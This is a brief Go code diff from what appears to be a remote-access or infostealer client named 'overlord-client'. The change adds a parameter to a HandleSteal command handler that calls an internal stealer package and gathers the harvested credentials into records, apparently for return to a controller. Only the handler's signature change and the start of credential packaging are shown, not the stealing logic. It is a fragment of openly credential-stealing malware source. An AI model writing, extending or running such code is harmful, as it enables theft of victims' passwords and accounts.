@@ -10,7 +10,7 @@ import (
 	"overlord-client/internal/stealer"
 )
 
-func HandleSteal(ctx context.Context, env *rt.Env, cmdID string) error {
+func HandleSteal(ctx context.Context, env *rt.Env, cmdID string, envelope map[string]interface{}) error {
 	r := stealer.Run()
 
 	creds := make([]wire.StealCredential, 0, len(r.Credentials))
